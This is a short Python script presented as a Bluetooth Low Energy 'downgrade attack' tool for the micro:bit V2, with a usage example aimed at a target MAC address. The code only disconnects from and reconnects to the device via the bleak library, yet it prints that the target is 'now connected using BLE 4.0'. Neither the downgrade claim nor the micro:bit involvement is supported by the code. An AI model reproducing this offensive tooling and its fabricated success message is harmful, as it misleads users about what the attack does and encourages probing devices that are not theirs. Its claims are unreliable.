# microbit_ble_downgrade.py

"""
BLE Downgrade Attack for micro:bit V2

This script forces a BLE 5.0 device to downgrade to BLE 4.0, making it vulnerable to older exploits.

### Features:
- Forces a BLE device to reconnect using BLE 4.0 (`--downgrade <target_mac>`)
- Exploits devices that do not properly enforce BLE security levels

### Usage Examples:

1. Downgrade a BLE 5.0 device to BLE 4.0:
   ```sh
   python microbit_ble_downgrade.py --downgrade AA:BB:CC:DD:EE:FF
   ```

Requirements:
- Micro:bit V2
- Python 3.x
- bleak library (`pip install bleak`)
"""

import asyncio
from bleak import BleakClient
import argparse

# BLE Downgrade Attack
async def ble_downgrade(target_mac):
    """Forces a BLE 5.0 device to downgrade to BLE 4.0."""
    print(f"[+] Forcing {target_mac} to reconnect using BLE 4.0...")
    try:
        async with BleakClient(target_mac) as client:
            await client.disconnect()
            await asyncio.sleep(1)
            print("[+] Device disconnected. Forcing reconnection...")
            await client.connect()
            print(f"[+] {target_mac} is now connected using BLE 4.0!")
    except Exception as e:
        print(f"[-] Downgrade attack failed: {e}")

# Argument Parser
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BLE Downgrade Attack for micro:bit V2")
    parser.add_argument("--downgrade", help="Force a BLE device to downgrade to BLE 4.0", metavar="target_mac")
    
    args = parser.parse_args()
    loop = asyncio.get_event_loop()
    
    if args.downgrade:
        loop.run_until_complete(ble_downgrade(args.downgrade))
